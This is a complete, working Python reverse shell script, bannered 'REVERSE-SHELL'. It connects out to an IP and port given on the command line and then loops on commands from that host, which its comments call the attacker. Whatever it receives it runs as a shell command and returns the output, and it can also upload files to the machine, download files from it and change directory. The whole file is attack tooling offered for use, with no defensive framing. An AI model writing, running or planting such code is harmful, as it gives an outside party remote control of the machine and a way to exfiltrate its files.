import socket
import subprocess
import os
import sys  # Import sys module for command-line arguments

def main():
    # ASCII Art Banner
    banner = """
 ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                                                                                                   
    """
    print(banner)

    # Check for command-line arguments
    if len(sys.argv) != 3:
        print("Usage: python3 reverse_shell.py <target_ip> <target_port>")
        sys.exit(1)

    # Replace with your IP address and port from command-line arguments
    target_ip = sys.argv[1]
    try:
        target_port = int(sys.argv[2])  # Convert port to integer
    except ValueError:
        print("Error: Port must be an integer.")
        sys.exit(1)

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the target
        s.connect((target_ip, target_port))
    except Exception as e:
        print(f"Error: Could not connect to {target_ip}:{target_port}. {e}")
        sys.exit(1)

    while True:
        # Receive the command from the attacker
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break

        elif command[:6] == 'upload':
            filename = command[7:]
            with open(filename, 'wb') as f:
                data = s.recv(4096)
                while data:
                    f.write(data)
                    data = s.recv(4096)
            s.send(str.encode('File uploaded successfully\n'))

        elif command[:8] == 'download':
            filename = command[9:]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    data = f.read(4096)
                    while data:
                        s.send(data)
                        data = f.read(4096)
                s.send(str.encode('File downloaded successfully\n'))
            else:
                s.send(str.encode('File not found\n'))

        elif command[:2] == 'cd':
            os.chdir(command[3:])
            s.send(str.encode(os.getcwd() + '> '))

        else:
            output = subprocess.getoutput(command)
            s.send(str.encode(output + '\n'))

    # Close the connection
    s.close()

if __name__ == "__main__":
    main()
